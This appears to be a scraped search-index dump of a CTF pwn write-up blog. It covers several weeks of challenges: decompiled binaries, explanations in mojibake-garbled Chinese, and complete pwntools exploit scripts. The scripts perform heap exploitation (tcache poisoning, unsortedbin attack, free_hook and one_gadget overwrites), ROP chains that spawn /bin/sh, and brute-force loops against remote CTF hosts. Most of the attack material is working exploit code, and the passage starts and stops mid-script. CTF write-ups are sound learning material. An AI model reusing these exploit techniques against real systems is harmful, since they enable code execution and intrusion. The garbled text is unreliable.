sh.sendlineafter('index:', str(idx)) sh.sendlineafter('size:', str(size)) sh.sendafter('data:', str(content)) def edit(idx, content): sh.sendlineafter('choice:', '3') sh.sendlineafter('index:', str(idx)) sh.sendafter('data:', str(content)) def delete(idx): sh.sendlineafter('choice:', '2') sh.sendlineafter('index:', str(idx)) for i in range(0x100): try: sh = process('./pwn') # sh = remote(\"101.200.201.114\", 30003) add(0, 0xf8, 'a'*8) add(1, 0xf8, 'a'*8) add(2, 0x30, 'a'*8) add(3, 0x60, ('a'*8).ljust(0x18, '\\x00') + p64(0x21)) add(4, 0x100, 'a'*8) add(5, 0x68, 'a'*8) add(6, 0x30, 'a'*8) add(7, 0x60, ('a'*8).ljust(0x18, '\\x00') + p64(0x21)) add(8, 0x60, 'a'*8) delete(3) edit(0, p64(0) * (0xf8 / 8) + '\\xb1') edit(1, 'a' * 0xf0 + p64(0) + p64(0x61)) delete(1) add(1, 0x130, 'a'*8) delete(2) add(2, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + '\\xdd\\x25') add(3, 0x60, 'a'*8) add(4, 0x60, 'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\\x00') libc = u64(sh.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c5600 leak('libc leak',libc) delete(7) edit(5, 'a' * 0x60 + p64(0) + '\\x61') delete(6) add(6, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + p64(libc + 0x3c4aed)) add(7, 0x60, 'a'*8) realloc = libc + 0x84710 payload = 'a' * 0xb + p64(libc + 0x4527a) + p64(realloc + 6) add(7, 0x60, payload) leak('realloc',realloc) sh.interactive() except : pass ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-6"},{"categories":["Writeups"],"content":"Challenges_100-Week_9 Challenges Tricks NahamconCTF-2021-meddle UAF+tcache_poisoning NahamconCTF-2021-rps stackoverflow+fmt V\u0026NCTF2021-PWN-White_Give_Flag force bypass angstromctf-2021-Secure Login force bypass angstromctf-2021-RAIId Shadow Legends è¦†å†™æœªåˆå§‹åŒ–å˜é‡åœ°å€ ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#challenges_100-week_9"},{"categories":["Writeups"],"content":"meddleps:test in local environment ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#meddle"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec"},{"categories":["Writeups"],"content":"IDAadd int add_album() { int v0; // eax __int64 v1; // rcx void **v2; // rax char *v4; // [rsp+8h] [rbp-8h] if ( count \u003e 17 ) { LODWORD(v2) = puts(\"no more albums :(\"); } else { v4 = (char *)malloc(0x84uLL); printf(\"enter album name: \"); fgets(v4 + 4, 80, stdin); printf(\"enter artist name: \"); fgets(v4 + 84, 48, stdin); v0 = count++; v1 = 8LL * v0; v2 = \u0026albums; *(void **)((char *)\u0026albums + v1) = v4; } return (int)v2; } view int view_album() { __int64 v0; // rax int v2; // [rsp+Ch] [rbp-4h] printf(\"what album would you like to view? \"); v2 = getnum(); if ( v2 \u003c 0 || v2 \u003e= count ) { LODWORD(v0) = puts(\"invalid index :(\"); } else { v0 = (__int64)*(\u0026albums + v2); if ( v0 ) { printf(\"album name: %s\\n\", (const char *)*(\u0026albums + v2) + 4); printf(\"artist: %s\\n\", (const char *)*(\u0026albums + v2) + 84); LODWORD(v0) = printf(\"ratings: %d\\n\", *(unsigned int *)*(\u0026albums + v2)); } } return v0; } rate int rate_album() { __int64 v0; // rax _DWORD *v1; // rbx int v3; // [rsp+Ch] [rbp-14h] printf(\"what album would you like to rate? \"); v3 = getnum(); if ( v3 \u003c 0 || v3 \u003e= count ) { LODWORD(v0) = puts(\"invalid index :(\"); } else { v0 = (__int64)*(\u0026albums + v3); if ( v0 ) { printf(\"\\nwhat do you want to rate this album? \"); v1 = *(\u0026albums + v3); LODWORD(v0) = getnum(); *v1 = v0; } } return v0; } delete void delete_album() { int v0; // [rsp+Ch] [rbp-4h] printf(\"what album would you like to delete? \"); v0 = getnum(); if ( v0 \u003c 0 || v0 \u003e= count ) puts(\"invalid index :(\"); else free(*(\u0026albums + v0)); } æ¼æ´ç‚¹ä¸ºfreeæ—¶æ²¡æœ‰å°†æŒ‡é’ˆé”€æ¯ï¼Œä¸”æ²¡ç”¨ä»»ä½•æ ‡å¿—ï¼Œé€ æˆäº†UAFã€‚libcç‰ˆæœ¬ä¸º2.27ï¼Œæœ‰tcacheä½†æ˜¯æ²¡æœ‰double freeæ£€æŸ¥ã€‚ é¦–å…ˆï¼Œå°†tcacheå¡«æ»¡ï¼Œå†åˆ©ç”¨UAFï¼Œleak main_arenaçš„åœ°å€ã€‚ä¹‹ååˆ©ç”¨tcache_poisoningï¼Œç”³è¯·åˆ°__free_hookï¼Œå°†å…¶è¦†å†™ä¸ºonegadget ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./meddle' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so') def add(album, artist): p.recvuntil('\u003e ') p.sendline('1') p.recvuntil('enter album name: ') p.sendline(str(album)) p.recvuntil('enter artist name: ') p.sendline(str(artist)) def view(index): p.recvuntil('\u003e ') p.sendline('2') p.recvuntil('what album would you like to view? ') p.sendline(str(index)) def rate(index,rate): p.recvuntil('\u003e ') p.sendline('3') p.recvuntil('what do you want to rate this album? ') p.sendline(str(rate)) def dele(index): p.recvuntil('\u003e ') p.sendline('4') p.recvuntil('what album would you like to delete? ') p.sendline(str(index)) for i in range(7): add(str(i)*4,str(i)*4) add('aaa','aaa') # 7 add('bbb','bbb') # 8 for i in range(7): dele(i) dele(7) #gdb.attach(p) view(7) high_bits = hex(u16(p.recvuntil('\\x7f')[-2:].ljust(2,b'\\x00'))) p.recvuntil('ratings: ') low_bits = \"%x\" % int(p.recvuntil('\\n')[:-1]) main_arena = high_bits+low_bits main_arena = int(main_arena.replace(\"-\", \"\"), 16) - 96 leak('main_arena',main_arena) malloc_hook = main_arena - 0x10 libcbase = main_arena - 0x3ebd00 offset = 0x7f158ab6a8e8-0x7f158ab68c30 free_hook = libcbase + libc.sym['__free_hook'] leak('malloc_hook',malloc_hook) leak('libcbase',libcbase) leak('free_hook',free_hook) for i in range(5): add(str(i)*4,str(i)*4) #9 10 11 12 13 dele(12) dele(12) add(p32(free_hook \u003e\u003e 32), \"bbb\")#14 rate(12, free_hook \u0026 0xffffffff) add('nnn','nnn')#15 one_gadget = libcbase + 0x4f322 add(p32(one_gadget \u003e\u003e 32), \"bbb\") #16 rate(16, one_gadget \u0026 0xffffffff) p.recvuntil('\u003e ') p.sendline('5') p.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp"},{"categories":["Writeups"],"content":"rps","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#rps"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec-1"},{"categories":["Writeups"],"content":"IDA void play() { unsigned int v0; // eax int v1; // [rsp+4h] [rbp-Ch] BYREF int v2; // [rsp+8h] [rbp-8h] char v3; // [rsp+Fh] [rbp-1h] v3 = 1; v0 = time(0LL); srand(v0); while ( v3 ) { v2 = rand() % 3 + 1; sub_4012C9(); __isoc99_scanf(off_404028, \u0026v1); getchar(); if ( v2 == v1 ) puts(\"Congrats you win!!!!!\"); else puts(\"You lose!\"); putchar(10); printf(\"Would you like to play again? [yes/no]: \"); read(0, \u0026s2, 0x19uLL); if ( !strcmp(\"no\\n\", \u0026s2) ) { v3 = 0; } else if ( !strcmp(\"yes\\n\", \u0026s2) ) { v3 = 1; } else { puts(\"Well you didn't say yes or no..... So I'm assuming no.\"); v3 = 0; } memset(\u0026s2, 0, 4uLL); } } read(0, \u0026s2, 0x19uLL);è¦†å†™off_404028ï¼Œä½¿å…¶å˜æˆ%sï¼Œä»è€Œäº§ç”Ÿæº¢å‡ºã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./rps' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.31.so') read_got = elf.got['read'] puts_plt = elf.plt['puts'] pop_rdi = 0x0000000000401513 one = [0xe6c7e,0xe6c81,0xe6c84] p.sendlineafter('[y/n]: ',b'y') p.sendlineafter('\u003e ',b'1') # gdb.attach(p) payload = b'yes\\n'+b'\\x00'*(0x19-4-1)+b'\\x08' p.sendlineafter('[yes/no]: ',payload) payload = b'a'*0x14+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(0x401453) p.sendlineafter('\u003e ',payload) p.sendlineafter('[yes/no]: ','no\\n') read_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = read_addr - libc.sym['read'] system = libcbase+libc.sym['system'] binsh=next(libc.search(b\"/bin/sh\")) one_gadget = libcbase+one[1] leak('libcbase',libcbase) gdb.attach(p) pop_4=0x000000000040150c ret = 0x040101a p.sendlineafter('[y/n]:',b'y') payload = b'a'*0x14+p64(one_gadget)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendlineafter('\u003e ',payload) p.sendlineafter('[yes/no]: ','no\\n') p.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-1"},{"categories":["Writeups"],"content":"White_Give_Flag","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#white_give_flag"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#checksec-2"},{"categories":["Writeups"],"content":"IDA v0 = time(0LL); srand(v0); qword_202120[0] = (__int64)aThereIsNoVulnI; qword_202128 = (__int64)aThereIsNoVulnI_0; qword_202130 = (__int64)aThereIsNoVulnI_1; qword_202138 = (__int64)aThereIsNoVulnI_2; qword_202140 = (__int64)aBye; s = (char *)malloc(0x200uLL); for ( i = 0LL; i \u003c random() % 11 + 5; ++i ) { memset(s, 0, 0x100uLL); free(s); v1 = random(); s = (char *)malloc(v1 % 0x201 + 0x300); open(\"./flag\", 0); read(3, s + 16, 0x26uLL); close(3); } free(s); main void __fastcall main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+Ch] [rbp-4h] sub_B1A(a1, a2, a3); while ( 1 ) { menu(); v3 = choice(); puts((const char *)qword_202120[v3 - 1]); switch ( v3 ) { case 1: add(); break; case 2: show(); break; case 3: dele(); break; case 4: edit(); break; case 5: exit(0); default: puts(\"Invalid!\"); exit(0); } } } æ˜¯ä¸ªä¸åŒå¯»å¸¸çš„å †é¢˜ï¼Œå†è¿›å…¥èœå•å‰ï¼Œç”³è¯·äº†éšæœºsizeä¸º0x300-0x500çš„chunkï¼Œå¹¶å°†flagï¼Œæ”¾åˆ°äº†åç§»+0x10çš„ä½ç½®ã€‚ v3 = choice();è¿”å›çš„æ˜¯è¯»å–çš„å­—èŠ‚æ•°ï¼Œputs((const char *)qword_202120[v3 - 1]);è¿™é‡Œæ ¹æ®é€‰é¡¹å°†ä¸€æ®µå­—ç¬¦è¿›è¡Œäº†è¾“å‡ºã€‚ qword_202120é™„è¿‘æ˜¯chunkæ•°ç»„çš„åœ°å€ï¼Œå®ƒå‰é¢å°±æ˜¯chunk[3]ã€‚ åˆ©ç”¨æ€è·¯æ˜¯ï¼Œå…ˆéšæœºç”³è¯·ä¸‰ä¸ªå°chunkï¼Œæœ€åç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„chunkï¼Œè¿™äº›chunkéƒ½æ˜¯ä»åŒ…å«flagçš„é‚£ä¸ªchunkä¸­åˆ†å‰²å‡ºæ¥çš„ï¼Œå°†å‰é¢çš„\\x00ä½¿ç”¨editè¿›è¡Œå¡«è¡¥ã€‚ä¹‹åé€šè¿‡æˆªæ–­è¾“å…¥æµä½¿v3=0ï¼Œè¿™æ ·putså°±ä¼šè¾“å‡ºchunkä¸­çš„å†…å®¹ã€‚è¿›è¡Œçˆ†ç ´ï¼Œè‹¥æœ€åç”³è¯·çš„chunkæ­£å¥½åˆ°flagçš„ä½ç½®ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-9/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,hex(addr))) # context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./White_Give_Flag' #gdb.attach(p) # if local: # sh=process(binary) # else: # sh=remote('node4.buuoj.cn', 39123) elf = ELF(binary,checksec=False) def add(size): sh.sendlineafter('choice:','') sh.sendlineafter('size:',str(size)) def show(): sh.sendlineafter('choice:','2') def dele(index): sh.sendlineafter('choice:','33') sh.sendlineafter('index:',str(index)) def edit(index,content): sh.sendlineafter('choice:','444') sh.sendlineafter('index:',str(index)) sh.sendlineafter('Content:',str(content)) def exit(): sh.sendlineafter('choice:','5555') while True: sh=remote('node4.buuoj.cn', 39123) add(0x10) add(0x10) add(0x10) add(0x310) edit(3,'+'*0x10) # sh.recvuntil('choice:') sh.shutdown_raw('send') flag = sh.recv() log.info(flag) if 'vnctf{' in flag or '}' in flag: exit(0) sh.close() sleep(1) ","date":"2021-04-18","objectID":"/challenges-100-week-9/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-2"},{"categories":["Writeups"],"content":"Secure Login #include \u003cstdio.h\u003e char password[128]; void generate_password() { FILE *file = fopen(\"/dev/urandom\",\"r\"); fgets(password, 128, file); fclose(file); } void main() { puts(\"Welcome to my ultra secure login service!\"); // no way they can guess my password if it's random! generate_password(); char input[128]; printf(\"Enter the password: \"); fgets(input, 128, stdin); if (strcmp(input, password) == 0) { char flag[128]; FILE *file = fopen(\"flag.txt\",\"r\"); if (!file) { puts(\"Error: missing flag.txt.\"); exit(1); } fgets(flag, 128, file); puts(flag); } else { puts(\"Wrong!\"); } } è¿™é‡Œé€šè¿‡/dev/urandomç”Ÿæˆçš„éšæœºå¯†ç ï¼Œstrcmpåœ¨æ¯”è¾ƒçš„çš„ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¼ å…¥çš„æ•°æ®éƒ½å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œå½“é‡åˆ°â€™\\x00â€™å’Œâ€™\\nâ€™çš„æ—¶å€™ï¼Œæ¯”è¾ƒå°±ç»“æŸäº†ã€‚ é€šè¿‡/dev/urandomç”Ÿæˆçš„å­—ç¬¦ä¸²ä¹Ÿæ˜¯æœ‰ä¸€å®šçš„å‡ ç‡ç”Ÿæˆå¼€å¤´å°±â€™\\x00â€™æˆªæ–­çš„å­—ç¬¦çš„ï¼Œæ‰€ä»¥é€šè¿‡æš´åŠ›ç ´è§£å°±å¯ä»¥bypassæ£€æŸ¥ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#secure-login"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" context.log_level = 'error' local=1 binary='./login' #gdb.attach(sh) # if local: # sh=process(binary) # else: # sh=remote('shell.actf.co',21820) # elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) for i in range(10000): sh=process(binary) sh.sendline('\\x00') sh.recvuntil(': ') buf = sh.recv() if (not 'Wrong!' in buf): print(buf) sh.close() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-3"},{"categories":["Writeups"],"content":"RAIId Shadow Legends #include \u003ciostream\u003e#include \u003cfstream\u003e#include \u003cstring\u003e using namespace std; ifstream flag(\"flag.txt\"); struct character { int health; int skill; long tokens; string name; }; void play() { string action; character player; cout \u003c\u003c \"Enter your name: \" \u003c\u003c flush; getline(cin, player.name); cout \u003c\u003c \"Welcome, \" \u003c\u003c player.name \u003c\u003c \". Skill level: \" \u003c\u003c player.skill \u003c\u003c endl; while (true) { cout \u003c\u003c \"\\n1. Power up\" \u003c\u003c endl; cout \u003c\u003c \"2. Fight for the flag\" \u003c\u003c endl; cout \u003c\u003c \"3. Exit game\\n\" \u003c\u003c endl; cout \u003c\u003c \"What would you like to do? \" \u003c\u003c flush; cin \u003e\u003e action; cin.ignore(); if (action == \"1\") { cout \u003c\u003c \"Power up requires shadow tokens, available via in app purchase.\" \u003c\u003c endl; } else if (action == \"2\") { if (player.skill \u003c 1337) { cout \u003c\u003c \"You flail your arms wildly, but it is no match for the flag guardian. Raid failed.\" \u003c\u003c endl; } else if (player.skill \u003e 1337) { cout \u003c\u003c \"The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!\" \u003c\u003c endl; } else { cout \u003c\u003c \"It's a tough battle, but you emerge victorious. The flag has been recovered successfully: \" \u003c\u003c flag.rdbuf() \u003c\u003c endl; } } else if (action == \"3\") { return; } } } void terms_and_conditions() { string agreement; string signature; cout \u003c\u003c \"\\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. \"; cout \u003c\u003c \"As a subsidiary of the International Organization for Standardization, \"; cout \u003c\u003c \"we reserve the right to standardize and/or destandardize any gameplay \"; cout \u003c\u003c \"elements that are deemed fraudulent, unnecessary, beneficial to the \"; cout \u003c\u003c \"player, or otherwise undesirable in our authoritarian society where \"; cout \u003c\u003c \"social capital has been eradicated and money is the only source of \"; cout \u003c\u003c \"power, legal or otherwise.\\n\" \u003c\u003c endl; cout \u003c\u003c \"Do you agree to the terms and conditions? \" \u003c\u003c flush; cin \u003e\u003e agreement; cin.ignore(); while (agreement != \"yes\") { cout \u003c\u003c \"Do you agree to the terms and conditions? \" \u003c\u003c flush; cin \u003e\u003e agreement; cin.ignore(); } cout \u003c\u003c \"Sign here: \" \u003c\u003c flush; getline(cin, signature); } int main() { cout \u003c\u003c \"Welcome to RAIId Shadow Legends!\" \u003c\u003c endl; while (true) { cout \u003c\u003c \"\\n1. Start game\" \u003c\u003c endl; cout \u003c\u003c \"2. Purchase shadow tokens\\n\" \u003c\u003c endl; cout \u003c\u003c \"What would you like to do? \" \u003c\u003c flush; string action; cin \u003e\u003e action; cin.ignore(); if (action == \"1\") { terms_and_conditions(); play(); } else if (action == \"2\") { cout \u003c\u003c \"Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337.\" \u003c\u003c endl; } } } åœ¨ç”Ÿæˆç©å®¶ä¿¡æ¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•çš„ä¿®æ”¹æ“ä½œï¼Œä»…ä»…æ˜¯è¾“å‡ºã€‚æ‰€ä»¥å¦‚æœæ ˆçš„é‚£ä¸ªä½ç½®æœ¬æ¥å°±æ˜¯1337å°±ä¼šæ»¡è¶³è¦æ±‚ã€‚ æ‰€ä»¥åœ¨terms_and_conditionsè¾“å…¥0x539å°±å¯èƒ½æ”¹å˜æ ˆå†…å®¹ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#raiid-shadow-legends"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0} addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=1 binary='./raiid_shadow_legends' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('shell.actf.co',21300) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') sh.sendlineafter('What would you like to do?','1') for i in range(10): sh.sendlineafter('Do you agree to the terms and conditions?',p32(0x539)*2) sh.sendlineafter('Do you agree to the terms and conditions?','yes') sh.sendlineafter('Sign here:',p32(0x539)*2) sh.sendlineafter('Enter your name:',p32(0x539)*2) sh.sendline('2') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-9/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#exp-4"},{"categories":["Writeups"],"content":"Challenges_100-Week_8 Challenges Tricks BUU-hitcontraining-magicheap unsortedbin attack BUU-hitcontraining_bamboobax unlink/house_of_force BUU-0ctf_2017_babyheap heap overflow+house_of_spirit BUU-heapcreator off-by-one BUU-[ZJCTF2019]easyheap unlink å®‰æ’ä¸‰æœˆèµ›-fruitpie mmap attack NahamconCTF-2021-sort_it æ•°ç»„è¶…ç•Œ+ROP ","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#challenges_100-week_8"},{"categories":["Writeups"],"content":"BUU-hitcontraining-magicheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-hitcontraining-magicheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); *(\u0026heaparray + i) = malloc(size); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(2); } printf(\"Content of heap:\"); read_input(*(\u0026heaparray + i), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v4; } } return __readfsqword(0x28u) ^ v4; } edit unsigned __int64 edit_heap() { int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); v2 = atoi(buf); printf(\"Content of heap : \"); read_input(*(\u0026heaparray + v1), v2); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v4; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } è·ŸZJCTF2019ä¸€æ ·çš„é¢˜ç›®ä¸è¿‡å°†åé—¨æ”¹æˆäº†get shellï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨äº†ã€‚è¿™é‡Œåªè¦å‘magicå†™ä¸€ä¸ªå¤§æ•°å°±å¥½ï¼Œæ‰€ä»¥æƒ³åˆ°ä½¿ç”¨unsortedbin attackã€‚æ”¹äº†æ”¹è„šæœ¬ç›´æ¥æ‰“ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./magicheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29693) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') system_plt = elf.plt[\"system\"] free_got = elf.got[\"free\"] def add(size,content): sh.sendline(\"1\") sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap:', str(content)) def edit(index, size, content): sh.sendline(\"2\") sh.sendafter(\"Index :\", str(index)) sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap : ', str(content)) def free(index): sh.sendline(\"3\") sh.sendafter(\"Index :\", str(index)) heap_arry = 0x6020C0-8 magic = 0x6020A0 add(0x80,'a'*0x80) #0 add(0x80,'b'*0x80) #1 add(0x10,\"/bin/sh\\x00\\x00\\x00\") #2 free(1) payload = '' payload=payload.ljust(0x80,'a') payload+=p64(0)+p64(0x91)+p64(magic)+p64(magic-0x10) edit(0, 0x110, payload) add(0x80,'c'*0x80) #gdb.attach(sh) sh.sendline('4869') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp"},{"categories":["Writeups"],"content":"BUU-hitcontraining_bamboobax","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-hitcontraining_bamboobax"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-1"},{"categories":["Writeups"],"content":"IDAshow int show_item() { int i; // [rsp+Ch] [rbp-4h] if ( !num ) return puts(\"No item in the box\"); for ( i = 0; i \u003c= 99; ++i ) { if ( *((_QWORD *)\u0026unk_6020C8 + 2 * i) ) printf(\"%d : %s\", (unsigned int)i, *((const char **)\u0026unk_6020C8 + 2 * i)); } return puts(byte_401089); } add __int64 add_item() { int i; // [rsp+4h] [rbp-1Ch] int v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); if ( num \u003e 99 ) { puts(\"the box is full\"); } else { printf(\"Please enter the length of item name:\"); read(0, buf, 8uLL); v2 = atoi(buf); if ( !v2 ) { puts(\"invaild length\"); return 0LL; } for ( i = 0; i \u003c= 99; ++i ) { if ( !*((_QWORD *)\u0026unk_6020C8 + 2 * i) ) { *((_DWORD *)\u0026itemlist + 4 * i) = v2; *((_QWORD *)\u0026unk_6020C8 + 2 * i) = malloc(v2); printf(\"Please enter the name of item:\"); *(_BYTE *)(*((_QWORD *)\u0026unk_6020C8 + 2 * i) + (int)read(0, *((void **)\u0026unk_6020C8 + 2 * i), v2)) = 0; ++num; return 0LL; } } } return 0LL; } edit unsigned __int64 change_item() { int v1; // [rsp+4h] [rbp-2Ch] int v2; // [rsp+8h] [rbp-28h] char buf[16]; // [rsp+10h] [rbp-20h] BYREF char nptr[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = 